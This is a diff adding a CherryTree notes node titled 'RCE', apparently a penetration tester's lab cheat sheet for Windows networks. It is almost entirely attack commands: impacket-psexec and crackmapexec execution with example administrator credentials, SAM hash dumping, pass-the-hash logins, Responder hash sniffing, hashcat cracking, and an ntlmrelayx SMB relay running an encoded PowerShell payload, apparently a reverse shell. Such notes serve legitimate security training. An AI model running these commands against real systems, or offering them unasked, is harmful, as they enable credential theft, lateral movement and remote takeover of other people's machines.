@@ -1,0 +1,65 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="2" master_id="0" name="RCE" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723074320" ts_lastsave="1723075530">
+    <rich_text>
+If on windows we can use impacket or crackmapexec to run commands on powershell / cmd on windows machine
+
+</rich_text>
+    <rich_text family="monospace">impacket-psexec -h</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text family="monospace">impacket-psexec administrator:'Password123!'@10.10.110.17</rich_text>
+    <rich_text>
+
+-x for normal shell and -X for powershell
+</rich_text>
+    <rich_text family="monospace">crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</rich_text>
+    <rich_text>
+
+if multiple ppl share same admin -&gt; 
+</rich_text>
+    <rich_text family="monospace">crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</rich_text>
+    <rich_text>
+
+the SAM file contains password hashes for users:
+</rich_text>
+    <rich_text family="monospace">crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</rich_text>
+    <rich_text>
+
+if we only get the hash and not the password we can still login only by passing the hash:
+c</rich_text>
+    <rich_text family="monospace">rackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</rich_text>
+    <rich_text>
+
+Sniffing for hashes:
+setting up a responder which listens for a “misstype” on the broadcast for hashes
+</rich_text>
+    <rich_text family="monospace">sudo responder -I ens33</rich_text>
+    <rich_text>
+	stored in /</rich_text>
+    <rich_text family="monospace">usr/share/responder/logs/</rich_text>
+    <rich_text>
+cracking with hashcat:
+h</rich_text>
+    <rich_text family="monospace">ashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</rich_text>
+    <rich_text>
+
+SMB poisonung
+
+Turn setting off in responder / check:
+</rich_text>
+    <rich_text family="monospace">cat /etc/responder/Responder.conf | grep 'SMB ='
+	SMB = Off
+</rich_text>
+    <rich_text>
+Using impacket to poison the response and execute a powershell command with -c flag:
+</rich_text>
+    <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text family="monospace">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c ‘powershell -e JABjAGwAaQBlAG4AdAAgA</rich_text>
+    <rich_text>’
+</rich_text>
+  </node>
+</cherrytree>
